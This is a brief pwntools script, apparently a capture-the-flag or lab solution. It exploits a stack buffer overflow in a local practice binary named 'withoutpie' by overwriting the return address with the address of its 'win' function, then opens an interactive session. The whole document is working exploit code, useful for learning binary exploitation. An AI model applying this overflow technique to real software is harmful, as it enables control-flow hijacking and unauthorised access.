from pwn import *
p=process("./withoutpie")
elf=ELF("./withoutpie")
winaddr = elf.sym["win"]
payload = b"A"*(0x71 + 4) + p64(winaddr) 
p.sendline(payload)
p.interactive()
